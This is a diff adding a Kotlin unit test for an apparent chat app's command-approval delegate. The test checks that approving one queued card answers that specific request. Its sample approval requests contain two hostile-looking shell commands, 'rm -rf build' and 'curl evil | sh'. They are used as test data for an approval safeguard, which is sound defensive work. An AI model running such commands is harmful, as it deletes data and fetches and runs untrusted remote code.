@@ -149,6 +149,35 @@ class ChatApprovalsDelegateTest {
         }
 
     @Test
+    fun respondToApproval_answersTheTappedCardNotTheNewest() =
+        testScope.runTest {
+            runtimeId = "runtime-session-xyz"
+            listOf("req-old" to "rm -rf build", "req-new" to "curl evil | sh").forEach { (id, cmd) ->
+                delegate.handleApprovalRequest(
+                    WsEvent.ApprovalRequest(
+                        command = cmd,
+                        description = null,
+                        patternKeys = null,
+                        sessionId = null,
+                        requestId = id,
+                    ),
+                )
+            }
+            advanceUntilIdle()
+            sentMethods.clear()
+            sentParams.clear()
+            val older = uiState.value.messages.first { it.approvalInfo?.requestId == "req-old" }
+
+            delegate.respondToApproval("always", messageId = older.id)
+            advanceUntilIdle()
+
+            assertEquals(JsonPrimitive("always"), sentParams[0]["choice"])
+            assertEquals(JsonPrimitive("req-old"), sentParams[0]["request_id"])
+            val remaining = uiState.value.messages.mapNotNull { it.approvalInfo?.requestId }
+            assertEquals(listOf("req-new"), remaining)
+        }
+
+    @Test
     fun maybeSurfacePendingApproval_dedupesExistingOnScreenRequestId() {
         delegate.handleApprovalRequest(
             WsEvent.ApprovalRequest(
